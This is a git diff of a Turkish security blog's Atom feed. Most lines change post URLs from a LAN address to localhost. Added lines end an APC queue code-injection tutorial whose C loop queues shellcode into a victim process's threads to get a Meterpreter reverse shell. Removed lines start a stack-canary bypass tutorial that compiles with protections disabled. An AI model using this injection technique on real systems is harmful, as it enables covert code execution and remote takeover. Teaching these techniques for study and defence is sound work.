+&lt;p&gt;İkinci paramterle olarakta bir üstünde belirttiğimiz &lt;strong&gt;threadHandle&lt;/strong&gt; değişkenini alıyor yani her döngüde yenilenen &lt;strong&gt;Kurban&lt;/strong&gt; yazılım içerisinde bulunan &lt;strong&gt;Thread&lt;/strong&gt;‘leri.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for (DWORD threadId : threadIds) {
+		printf(&quot;Thread : 0x%08x\n&quot;, threadId);
+		threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
+		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
+		getchar();
+	}
+	
+return 0;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bu fonksiyonun basitçe yaptığı şu &lt;strong&gt;Shellcode&lt;/strong&gt; adresimizi bir &lt;strong&gt;APC&lt;/strong&gt; fonksiyonu olarak görüyor ve bunu &lt;strong&gt;Kurban&lt;/strong&gt; yazılım içerisinde çalışan &lt;strong&gt;Thread&lt;/strong&gt;‘lerden birine atıyor.&lt;/p&gt;
+
+&lt;p&gt;Dolayısı ile &lt;strong&gt;Thread&lt;/strong&gt; bizim &lt;strong&gt;Shellcode&lt;/strong&gt;‘umuzu çalıştırıyor.&lt;/p&gt;
+
+&lt;p&gt;Tabi diyebilirsiniz ki &lt;strong&gt;Hangi thread’ı kullanması gerektiğini nereden biliyor ?&lt;/strong&gt; diye. Çok güzel bir soru.&lt;/p&gt;
+
+&lt;p&gt;Seçtiği &lt;strong&gt;Thread&lt;/strong&gt;‘ın içeriği bir &lt;strong&gt;Alertable State&lt;/strong&gt; içeren &lt;strong&gt;APC&lt;/strong&gt; fonksiyonu olmak zorunda.&lt;/p&gt;
+
+&lt;p&gt;Daha da basiti : &lt;strong&gt;SleepEx&lt;/strong&gt;‘i içeren bir &lt;strong&gt;Thread&lt;/strong&gt; ise &lt;strong&gt;Shellcode&lt;/strong&gt; çalışıyor.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Döngü&lt;/strong&gt;‘nün son kodu olarak eklediğim &lt;strong&gt;getchar&lt;/strong&gt; bunu sağlıyor aslında.&lt;/p&gt;
+
+&lt;p&gt;Yani eğer &lt;strong&gt;Shellcode&lt;/strong&gt;‘u ekleyeceği doğru &lt;strong&gt;Thread&lt;/strong&gt; değilse &lt;strong&gt;ENTER&lt;/strong&gt; tuşuna basıp program içerisindeki başka bir &lt;strong&gt;Thread&lt;/strong&gt;‘ı deneyebiliyoruz.&lt;/p&gt;
+
+&lt;p&gt;Ama &lt;strong&gt;Kurban&lt;/strong&gt; yazılım içerisinde sadece bir &lt;strong&gt;APC&lt;/strong&gt; fonksiyonu kullandığımızdan oda &lt;strong&gt;SleepEx&lt;/strong&gt; fonksiyonu olduğundan ilk &lt;strong&gt;Thread&lt;/strong&gt;‘da direk &lt;strong&gt;Meterpreter&lt;/strong&gt;‘den &lt;strong&gt;reverse_tcp&lt;/strong&gt; yani erişimi alacağızdır.&lt;/p&gt;
+
+&lt;h3 id=&quot;proof-of-concept--poc-&quot;&gt;Proof Of Concept ( PoC )&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;Saldırgan&lt;/strong&gt; ve &lt;strong&gt;Kurban&lt;/strong&gt; yazılımlarının &lt;strong&gt;APC Queue Code Injection&lt;/strong&gt; etkileşiminin gerçekleştiği bir video hazırladım bakmak isterseniz.&lt;/p&gt;
+
+&lt;p&gt;Video : &lt;a href=&quot;https://www.youtube.com/watch?v=KmrTowxl6Ho&quot;&gt;APC Queue Code Injection PoC&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;the-end&quot;&gt;THE END&lt;/h1&gt;
+&lt;p&gt;Bu yazının sonuna da geldik.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Process Shellcode Injection&lt;/strong&gt; tekniklerinden sadece bir tanesidir bu.&lt;/p&gt;
+
+&lt;p&gt;Daha önce &lt;strong&gt;Process Shellcode Injection&lt;/strong&gt; nedir hakkında bir yazı yayınladım eğer anlayamayan olduysa bu yazıyı.&lt;/p&gt;
+
+&lt;p&gt;Bakmanızı öneririm : &lt;a href=&quot;https://blacknbunny.github.io/2019/04/28/Process-Shellcode-Injection.html&quot;&gt;Process Shellcode Injection&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Introduction to APC, Thread and APC Code Injection</summary></entry><entry><title type="html">Rootkit Development - (Part 1)</title><link href="http://localhost:4000/2019/05/29/rootkit-development-part-1.html" rel="alternate" type="text/html" title="Rootkit Development - (Part 1)" /><published>2019-05-29T00:00:00+03:00</published><updated>2019-05-29T00:00:00+03:00</updated><id>http://localhost:4000/2019/05/29/rootkit-development-part-1</id><content type="html" xml:base="http://localhost:4000/2019/05/29/rootkit-development-part-1.html">&lt;h1 id=&quot;rootkit-development---part-1&quot;&gt;Rootkit Development - (Part 1)&lt;/h1&gt;
 
 &lt;p&gt;Merhaba arkadaşlar.&lt;/p&gt;
 
@@ -702,7 +988,7 @@ e
 
 &lt;p&gt;&lt;strong&gt;Part 2&lt;/strong&gt;‘de daha da teknik detaya gireceğiz. Bir &lt;strong&gt;Rootkit&lt;/strong&gt;‘i başından sonuna nasıl geliştirebileceğimiz nelere dikkat etmemiz gerektiği gibi konulara ve daha bir çok teknik detaya değineceğiz.&lt;/p&gt;
 
-&lt;p&gt;Sorular için : &lt;a href=&quot;https://www.twitter.com/0DAYanc&quot;&gt;Twitter @0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Rootkit Development - (Part 1)</summary></entry><entry><title type="html">CVE Analizi ve Exploit Development</title><link href="http://192.168.254.251:4000/2019/05/24/cve-analizi-ve-exploit-development.html" rel="alternate" type="text/html" title="CVE Analizi ve Exploit Development" /><published>2019-05-24T00:00:00+03:00</published><updated>2019-05-24T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/05/24/cve-analizi-ve-exploit-development</id><content type="html" xml:base="http://192.168.254.251:4000/2019/05/24/cve-analizi-ve-exploit-development.html">&lt;h1 id=&quot;cve-analizi-ve-exploit-development&quot;&gt;CVE Analizi ve Exploit Development&lt;/h1&gt;
+&lt;p&gt;Sorular için : &lt;a href=&quot;https://www.twitter.com/0DAYanc&quot;&gt;Twitter @0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Rootkit Development - (Part 1)</summary></entry><entry><title type="html">CVE Analizi ve Exploit Development</title><link href="http://localhost:4000/2019/05/24/cve-analizi-ve-exploit-development.html" rel="alternate" type="text/html" title="CVE Analizi ve Exploit Development" /><published>2019-05-24T00:00:00+03:00</published><updated>2019-05-24T00:00:00+03:00</updated><id>http://localhost:4000/2019/05/24/cve-analizi-ve-exploit-development</id><content type="html" xml:base="http://localhost:4000/2019/05/24/cve-analizi-ve-exploit-development.html">&lt;h1 id=&quot;cve-analizi-ve-exploit-development&quot;&gt;CVE Analizi ve Exploit Development&lt;/h1&gt;
 
 &lt;p&gt;Merhaba arkadaşlar &lt;strong&gt;CVE Analizi&lt;/strong&gt; ve &lt;strong&gt;Exploit Development&lt;/strong&gt; isimli yazıma hoşgeldiniz.&lt;/p&gt;
 
@@ -906,7 +1192,7 @@ e
 
 &lt;p&gt;Bir &lt;strong&gt;CVE&lt;/strong&gt;‘nin ne olduğundan ve bunun &lt;strong&gt;Analizi&lt;/strong&gt;‘nin nasıl yapılacağından aynı zamanda &lt;strong&gt;Zafiyet&lt;/strong&gt;‘ler için nasıl &lt;strong&gt;Sömürge Kodu&lt;/strong&gt; yani &lt;strong&gt;Exploit&lt;/strong&gt; geliştirilebileceğinden bahsettim.&lt;/p&gt;
 
-&lt;p&gt;Sorularınız mevcut ise : &lt;a href=&quot;https://twitter.com/0DAYanc&quot;&gt;Twitter&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">CVE Analizi ve Exploit Development</summary></entry><entry><title type="html">Malware Analysis - Dynamic Analysis (Part 3)</title><link href="http://192.168.254.251:4000/2019/05/20/malware-analysis-part-3.html" rel="alternate" type="text/html" title="Malware Analysis - Dynamic Analysis (Part 3)" /><published>2019-05-20T00:00:00+03:00</published><updated>2019-05-20T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/05/20/malware-analysis-part-3</id><content type="html" xml:base="http://192.168.254.251:4000/2019/05/20/malware-analysis-part-3.html">&lt;h1 id=&quot;malware-analysis---dynamic-analysis-part-3&quot;&gt;Malware Analysis - Dynamic Analysis (Part 3)&lt;/h1&gt;
+&lt;p&gt;Sorularınız mevcut ise : &lt;a href=&quot;https://twitter.com/0DAYanc&quot;&gt;Twitter&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">CVE Analizi ve Exploit Development</summary></entry><entry><title type="html">Malware Analysis - Dynamic Analysis (Part 3)</title><link href="http://localhost:4000/2019/05/20/malware-analysis-part-3.html" rel="alternate" type="text/html" title="Malware Analysis - Dynamic Analysis (Part 3)" /><published>2019-05-20T00:00:00+03:00</published><updated>2019-05-20T00:00:00+03:00</updated><id>http://localhost:4000/2019/05/20/malware-analysis-part-3</id><content type="html" xml:base="http://localhost:4000/2019/05/20/malware-analysis-part-3.html">&lt;h1 id=&quot;malware-analysis---dynamic-analysis-part-3&quot;&gt;Malware Analysis - Dynamic Analysis (Part 3)&lt;/h1&gt;
 &lt;p&gt;Merhaba arkadaşlar &lt;strong&gt;Malware Analizi&lt;/strong&gt; serimin üçüncü part’ına hoşgeldiniz.&lt;/p&gt;
 
 &lt;p&gt;Bu partımızda artık canlı bir &lt;strong&gt;Malware&lt;/strong&gt; üzerinde işlemler gerçekleştireceğiz.&lt;/p&gt;
@@ -1132,7 +1418,7 @@ e
 
 &lt;p&gt;Sorunuz varsa çekinmeyin bu konuda veya farklı bir konuda.&lt;/p&gt;
 
-&lt;p&gt;Sorular için twitter adresim : &lt;a href=&quot;https://twitter.com/0DAYanc&quot;&gt;0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Malware Analysis - Dynamic Analysis (Part 3) Merhaba arkadaşlar Malware Analizi serimin üçüncü part’ına hoşgeldiniz.</summary></entry><entry><title type="html">Malware Analysis - Static Analysis (Part 2)</title><link href="http://192.168.254.251:4000/2019/05/18/malware-analysis-part-2.html" rel="alternate" type="text/html" title="Malware Analysis - Static Analysis (Part 2)" /><published>2019-05-18T00:00:00+03:00</published><updated>2019-05-18T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/05/18/malware-analysis-part-2</id><content type="html" xml:base="http://192.168.254.251:4000/2019/05/18/malware-analysis-part-2.html">&lt;h4 id=&quot;malware-analysis---static-analysis-part-2&quot;&gt;Malware Analysis - Static Analysis (Part 2)&lt;/h4&gt;
+&lt;p&gt;Sorular için twitter adresim : &lt;a href=&quot;https://twitter.com/0DAYanc&quot;&gt;0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Malware Analysis - Dynamic Analysis (Part 3) Merhaba arkadaşlar Malware Analizi serimin üçüncü part’ına hoşgeldiniz.</summary></entry><entry><title type="html">Malware Analysis - Static Analysis (Part 2)</title><link href="http://localhost:4000/2019/05/18/malware-analysis-part-2.html" rel="alternate" type="text/html" title="Malware Analysis - Static Analysis (Part 2)" /><published>2019-05-18T00:00:00+03:00</published><updated>2019-05-18T00:00:00+03:00</updated><id>http://localhost:4000/2019/05/18/malware-analysis-part-2</id><content type="html" xml:base="http://localhost:4000/2019/05/18/malware-analysis-part-2.html">&lt;h4 id=&quot;malware-analysis---static-analysis-part-2&quot;&gt;Malware Analysis - Static Analysis (Part 2)&lt;/h4&gt;
 
 &lt;p&gt;Merhaba arkadaşlar &lt;strong&gt;Malware Analizi&lt;/strong&gt; serimin ikinci part’ına hoşgeldiniz.&lt;/p&gt;
 
@@ -1412,7 +1698,7 @@ e
 
 &lt;p&gt;Umarım yazıyı okurken keyif almışsınızdır.&lt;/p&gt;
 
-&lt;p&gt;Sorular için twitter : &lt;a href=&quot;https://twitter.com/0DAYanc&quot;&gt;0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Malware Analysis - Static Analysis (Part 2)</summary></entry><entry><title type="html">Malware Analysis - Lab Setup (Part 1)</title><link href="http://192.168.254.251:4000/2019/05/16/malware-analysis-part-1.html" rel="alternate" type="text/html" title="Malware Analysis - Lab Setup (Part 1)" /><published>2019-05-16T00:00:00+03:00</published><updated>2019-05-16T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/05/16/malware-analysis-part-1</id><content type="html" xml:base="http://192.168.254.251:4000/2019/05/16/malware-analysis-part-1.html">&lt;h1 id=&quot;malware-analysis-part-1&quot;&gt;Malware Analysis (Part 1)&lt;/h1&gt;
+&lt;p&gt;Sorular için twitter : &lt;a href=&quot;https://twitter.com/0DAYanc&quot;&gt;0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Malware Analysis - Static Analysis (Part 2)</summary></entry><entry><title type="html">Malware Analysis - Lab Setup (Part 1)</title><link href="http://localhost:4000/2019/05/16/malware-analysis-part-1.html" rel="alternate" type="text/html" title="Malware Analysis - Lab Setup (Part 1)" /><published>2019-05-16T00:00:00+03:00</published><updated>2019-05-16T00:00:00+03:00</updated><id>http://localhost:4000/2019/05/16/malware-analysis-part-1</id><content type="html" xml:base="http://localhost:4000/2019/05/16/malware-analysis-part-1.html">&lt;h1 id=&quot;malware-analysis-part-1&quot;&gt;Malware Analysis (Part 1)&lt;/h1&gt;
 
 &lt;p&gt;Merhaba arkadaşlar &lt;strong&gt;Malware Analizi&lt;/strong&gt; serimin ilk part’ına hoşgeldiniz.&lt;/p&gt;
 
@@ -1561,7 +1847,7 @@ Analist&lt;/strong&gt;‘leri için özel geliştirilmiş &lt;strong&gt;REMnux&l
 
 &lt;p&gt;Ve dahada ileriki partlarda dahada teknik detaylara gireceğiz.&lt;/p&gt;
 
-&lt;p&gt;Sağlıcakla Kalın !&lt;/p&gt;</content><author><name></name></author><summary type="html">Malware Analysis (Part 1)</summary></entry><entry><title type="html">Linux System Call Hooking</title><link href="http://192.168.254.251:4000/2019/05/07/linux-system-call-hooking.html" rel="alternate" type="text/html" title="Linux System Call Hooking" /><published>2019-05-07T00:00:00+03:00</published><updated>2019-05-07T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/05/07/linux-system-call-hooking</id><content type="html" xml:base="http://192.168.254.251:4000/2019/05/07/linux-system-call-hooking.html">&lt;h1 id=&quot;linux-system-call-hooking&quot;&gt;Linux System Call Hooking&lt;/h1&gt;
+&lt;p&gt;Sağlıcakla Kalın !&lt;/p&gt;</content><author><name></name></author><summary type="html">Malware Analysis (Part 1)</summary></entry><entry><title type="html">Linux System Call Hooking</title><link href="http://localhost:4000/2019/05/07/linux-system-call-hooking.html" rel="alternate" type="text/html" title="Linux System Call Hooking" /><published>2019-05-07T00:00:00+03:00</published><updated>2019-05-07T00:00:00+03:00</updated><id>http://localhost:4000/2019/05/07/linux-system-call-hooking</id><content type="html" xml:base="http://localhost:4000/2019/05/07/linux-system-call-hooking.html">&lt;h1 id=&quot;linux-system-call-hooking&quot;&gt;Linux System Call Hooking&lt;/h1&gt;
 
 &lt;p&gt;Merhaba arkadaşlar &lt;strong&gt;Linux System Call Hooking&lt;/strong&gt; isimli yazıma hoşgeldiniz.&lt;/p&gt;
 
@@ -1942,7 +2228,7 @@ modules.order  syscallhook.c   syscallhook.mod.c  syscallhook.o
 
 &lt;p&gt;Ve bu yazının da sonunda geldik. Umarım açıklayıcı anlatabilmişimdir.&lt;/p&gt;
 
-&lt;p&gt;Sorular için twitter hesabım : &lt;a href=&quot;https://twitter.com/0DAYanc&quot;&gt;@0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Linux System Call Hooking</summary></entry><entry><title type="html">Process Shellcode Injection</title><link href="http://192.168.254.251:4000/2019/04/28/Process-Shellcode-Injection.html" rel="alternate" type="text/html" title="Process Shellcode Injection" /><published>2019-04-28T00:00:00+03:00</published><updated>2019-04-28T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/04/28/Process-Shellcode-Injection</id><content type="html" xml:base="http://192.168.254.251:4000/2019/04/28/Process-Shellcode-Injection.html">&lt;h3 id=&quot;process-shellcode-injection&quot;&gt;Process Shellcode Injection&lt;/h3&gt;
+&lt;p&gt;Sorular için twitter hesabım : &lt;a href=&quot;https://twitter.com/0DAYanc&quot;&gt;@0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Linux System Call Hooking</summary></entry><entry><title type="html">Process Shellcode Injection</title><link href="http://localhost:4000/2019/04/28/Process-Shellcode-Injection.html" rel="alternate" type="text/html" title="Process Shellcode Injection" /><published>2019-04-28T00:00:00+03:00</published><updated>2019-04-28T00:00:00+03:00</updated><id>http://localhost:4000/2019/04/28/Process-Shellcode-Injection</id><content type="html" xml:base="http://localhost:4000/2019/04/28/Process-Shellcode-Injection.html">&lt;h3 id=&quot;process-shellcode-injection&quot;&gt;Process Shellcode Injection&lt;/h3&gt;
 
 &lt;p&gt;Merhaba arkadaşlar yeni yazıma hoşgeldiniz.&lt;/p&gt;
 
@@ -2112,7 +2398,7 @@ modules.order  syscallhook.c   syscallhook.mod.c  syscallhook.o
 
 &lt;p&gt;&lt;a href=&quot;https://youtu.be/oaNvWM9k84g&quot;&gt;Demo Video&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;Yazı hakkında aklınızda soru işareti varsa twitter hesabım : &lt;a href=&quot;https://www.twitter.com/0DAYanc&quot;&gt;@0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Process Shellcode Injection</summary></entry><entry><title type="html">Loadable Kernel Module Development</title><link href="http://192.168.254.251:4000/2019/04/22/loadable-kernel-module.html" rel="alternate" type="text/html" title="Loadable Kernel Module Development" /><published>2019-04-22T00:00:00+03:00</published><updated>2019-04-22T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/04/22/loadable-kernel-module</id><content type="html" xml:base="http://192.168.254.251:4000/2019/04/22/loadable-kernel-module.html">&lt;h1 id=&quot;loadable-kernel-module-lkm&quot;&gt;Loadable Kernel Module (LKM)&lt;/h1&gt;
+&lt;p&gt;Yazı hakkında aklınızda soru işareti varsa twitter hesabım : &lt;a href=&quot;https://www.twitter.com/0DAYanc&quot;&gt;@0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Process Shellcode Injection</summary></entry><entry><title type="html">Loadable Kernel Module Development</title><link href="http://localhost:4000/2019/04/22/loadable-kernel-module.html" rel="alternate" type="text/html" title="Loadable Kernel Module Development" /><published>2019-04-22T00:00:00+03:00</published><updated>2019-04-22T00:00:00+03:00</updated><id>http://localhost:4000/2019/04/22/loadable-kernel-module</id><content type="html" xml:base="http://localhost:4000/2019/04/22/loadable-kernel-module.html">&lt;h1 id=&quot;loadable-kernel-module-lkm&quot;&gt;Loadable Kernel Module (LKM)&lt;/h1&gt;
 
 &lt;p&gt;Merhaba arkadaşlar. &lt;strong&gt;Loadable Kernel Module (LKM)&lt;/strong&gt; yazıma hoşgeldiniz.&lt;/p&gt;
 
@@ -2266,7 +2552,7 @@ remnux@remnux:~/heyhey$
 
 &lt;p&gt;Bir daha ki yazımda büyük ihtimal &lt;strong&gt;sys_call_table hijacking&lt;/strong&gt; anlatacağım.&lt;/p&gt;
 
-&lt;p&gt;Sonra ki yazılarda da artık bir rootkit yazarız diye düşünüyorum. Kendinize iyi bakın görüşmek dileği ile !&lt;/p&gt;</content><author><name></name></author><summary type="html">Loadable Kernel Module (LKM)</summary></entry><entry><title type="html">Linux Function Hooking</title><link href="http://192.168.254.251:4000/2019/04/14/Linux-Function-Hooking.html" rel="alternate" type="text/html" title="Linux Function Hooking" /><published>2019-04-14T00:00:00+03:00</published><updated>2019-04-14T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/04/14/Linux-Function-Hooking</id><content type="html" xml:base="http://192.168.254.251:4000/2019/04/14/Linux-Function-Hooking.html">&lt;h1 id=&quot;linux-load-time-function-hooking&quot;&gt;Linux Load-Time Function Hooking&lt;/h1&gt;
+&lt;p&gt;Sonra ki yazılarda da artık bir rootkit yazarız diye düşünüyorum. Kendinize iyi bakın görüşmek dileği ile !&lt;/p&gt;</content><author><name></name></author><summary type="html">Loadable Kernel Module (LKM)</summary></entry><entry><title type="html">Linux Function Hooking</title><link href="http://localhost:4000/2019/04/14/Linux-Function-Hooking.html" rel="alternate" type="text/html" title="Linux Function Hooking" /><published>2019-04-14T00:00:00+03:00</published><updated>2019-04-14T00:00:00+03:00</updated><id>http://localhost:4000/2019/04/14/Linux-Function-Hooking</id><content type="html" xml:base="http://localhost:4000/2019/04/14/Linux-Function-Hooking.html">&lt;h1 id=&quot;linux-load-time-function-hooking&quot;&gt;Linux Load-Time Function Hooking&lt;/h1&gt;
 
 &lt;p&gt;Uzun bir süreden sonra bloguma yazı yazıyorum. 2019’un ilk blog yazısı olacak umarım yazıyı beğenirsiniz.&lt;/p&gt;
 
@@ -2452,232 +2738,4 @@ Yeni mesaj
 remnux@remnux:~/hoq$
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Umarım yazıyı beğenmişsinizdir ve açıklayabilmişimdir &lt;strong&gt;Function Hooking&lt;/strong&gt;, &lt;strong&gt;Load-Time&lt;/strong&gt;, &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; vs.. gibi terimleri. İyi günler.&lt;/p&gt;</content><author><name></name></author><summary type="html">Linux Load-Time Function Hooking</summary></entry><entry><title type="html">Stack Canary Bypass</title><link href="http://192.168.254.251:4000/2018/11/17/Stack-Canary-Bypass.html" rel="alternate" type="text/html" title="Stack Canary Bypass" /><published>2018-11-17T00:00:00+03:00</published><updated>2018-11-17T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2018/11/17/Stack-Canary-Bypass</id><content type="html" xml:base="http://192.168.254.251:4000/2018/11/17/Stack-Canary-Bypass.html">&lt;p&gt;Yazımıza geçmeden önce ben videodan daha iyi öğrenirim diyen arkadaşlar için youtube’da çektiğim videoya alalım sizleri : &lt;a href=&quot;https://www.youtube.com/watch?v=sWKxjoZKhx4&amp;amp;t=845s&quot;&gt;Video&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Merhaba arkadaşlar bu blogum da sizlere standart güvenlik önlemlerinden biri olan &lt;strong&gt;Stack Canary&lt;/strong&gt; yani bir diğer adı ile de &lt;strong&gt;Stack Cookie&lt;/strong&gt;‘sinin nasıl bypass edileceğinden bahsedeceğim. Kafanız da güvenlik önemleri terimine ait bir yapı olmuşması için çoğumuzun bildiği bir kaç güvenlik önleminin ismini vererek yazıma başlamak istiyorum.  &lt;strong&gt;ASLR, NX, RELRO, SafeSEH, DEP&lt;/strong&gt; ve benzerleri… “Stack Canary” gibi güvenlik önlemleridir. Derleyiciniz ile bunları belirleyip işleme geçirebilirsiniz. Ya da işletim sisteminizi bunu otomatik belirlemesi için ayarlaya bilirsiniz.&lt;/p&gt;
-
-&lt;h1 id=&quot;güvenlik-önlemlerinden-kısa-bahsedelim&quot;&gt;Güvenlik Önlemlerinden kısa bahsedelim&lt;/h1&gt;
-
-&lt;p&gt;Güvenlik zafiyetlerinin sömürgesini bir az da olsa engellemek için vardırlar. Zafiyetler içerisinden en çok bilineni “Buffer Overflow” dur. Birazdan bahsedeceğimiz &lt;strong&gt;Stack Canary&lt;/strong&gt;‘nin bize &lt;strong&gt;Buffer Overflow&lt;/strong&gt; zafiyetini kullanmamamız için ne gibi engellerde bulunduğunu anlatmaya başladığımız da daha iyi kavrayacaksınızdır güvenlik önlemlerinin neler olduklarını.&lt;/p&gt;
-
-&lt;h1 id=&quot;stack-canary-nedir-&quot;&gt;Stack Canary Nedir ?&lt;/h1&gt;
-
-&lt;p&gt;&lt;strong&gt;Stack Canary&lt;/strong&gt; yazılım başlamadan önce yazılımın en üstünde &lt;strong&gt;EBP&lt;/strong&gt; registerine aktarılmaya hazır 32 bit ise &lt;strong&gt;GS&lt;/strong&gt; 64 bit ise &lt;strong&gt;FS&lt;/strong&gt; flaglerinde rastegele oluşturulmuş bir değer saklar. Ve programın sonunda da bu değer hala aynımı diye test eder. Aşşağıda ki küçük python kodu bunu daha basit açıklayabilir.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from random import randint
-cookie = randint(100, 100000)
-
-cookie_backup = cookie
-
-if cookie != cookie_backup:
- print(&quot;*** Stack Smash Detected ***&quot;)
- exit(0)
-else:
- devametbeklemeyapma()
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Yukarıda ki kodu anlamayanlar varsa basitçe anlatayım. 100 ile 100000 arasında rastgele bir sayı üretiyor ve bu ürettiğiyi sayıyı cookie değişkenine aktarıyor ve bu cookie değişkenini saklamak için cookie_backup değişkenine atıyor ve eğer bu cookie değişkeninin değeri programın sonunda aynı değil ise “Stack Smash Detected” outputunu verip programdan çıkış yapıyor. Aynı ise normal bir şekilde programa kışına devam ediyor. &lt;strong&gt;Stack Canary&lt;/strong&gt; basit bir şekilde bu işi yapıyor.&lt;/p&gt;
-
-&lt;p&gt;Eğer programın başında verilen cookie değeri değiştirildiyse programdan çıkış yapıyor. Aynı ise normal devam ediyor. Peki ya buffer overflowu engelleyen durum ne ? O kısımada birazdan geleceğiz.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Stack Canary&lt;/strong&gt; bizleri bulunan buffer alanının üzerine yazıp geçmekten alı koyan güvenlik önlemlerinden biridir. Bunun yapısını anlatmak için varsayalım ki aşşağıdaki gibi bir 64 bytelık buffer alanımız var.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;char buffer[64];
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ve bu buffer alanı dışardan gelen bir veriyi &lt;strong&gt;strcpy&lt;/strong&gt; fonksiyonu ile buffer alanının içerisine aktarıyor.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strcpy(buffer, argv[1]);
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Normal bir programın akışını &lt;strong&gt;Buffer Overflow&lt;/strong&gt; zafiyeti ile terse kullandığımız da normal olarak 64 byte’ın üzerinde bir değer yazacağımızdan alanı delip geçeceğizdir ve stack içerisinde değişkenlere, adreslere ve benzerlerine yazacak hale geleceğizdir. En önemlisi de &lt;strong&gt;EIP&lt;/strong&gt; registerinin üzerine yazmak ve return adresini kontrol edip programa kışını yönlendirmek. Fakat &lt;strong&gt;Stack Canary&lt;/strong&gt;‘nin &lt;strong&gt;Cookie&lt;/strong&gt;‘leri bize engel olacağından &lt;strong&gt;Buffer Overflow&lt;/strong&gt; zafiyetini kullanamayacağızdır.&lt;/p&gt;
-
-&lt;p&gt;Ve unutmayalım ki &lt;strong&gt;Cookie&lt;/strong&gt;‘ler &lt;strong&gt;dinamiktir&lt;/strong&gt; aynı değillerdir her program çalıştığın da farklı bir değer alırlar.&lt;/p&gt;
-
-&lt;p&gt;Stack içerisin de normal bir programın ve &lt;strong&gt;Stack Canary&lt;/strong&gt; güvenlik önleminin etkin olduğu programın görüntüsü :&lt;/p&gt;
-
-&lt;p&gt;Normal :&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-------------------
-|                 |
-|  Buffer         |
-|------------------
-|  Saved EIP |
--------------------
-|  Saved EBP |
-|------------------
-|  Return Address  |
- ------------------
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Stack Canary :&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-------------------
-|                 |
-|  Buffer         |
-|                 |
-|------------------
-|  Cookie         |
-|------------------
-|  Saved EIP      |
--------------------
-|  Saved EBP      |
--------------------
-|  __stack_chk_fail@plt |
-|------------------
-|  Return Address |
- ------------------
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;ortamımızı-hazırlayalım&quot;&gt;Ortamımızı hazırlayalım&lt;/h1&gt;
-
-&lt;p&gt;Aşşağıda ki kaynak kodu indirelim ve belirtilen opsiyonlar ile derliyelim. Sonra da &lt;strong&gt;ASLR&lt;/strong&gt;‘yi devre dışı bırakalım.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://pastebin.com/pUJwmRgu&quot;&gt;Örnek Buffer Overflow&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -Wl,-z,norelro -z execstack -no-pie canary.c -o canary&lt;/code&gt;&lt;/p&gt;
-
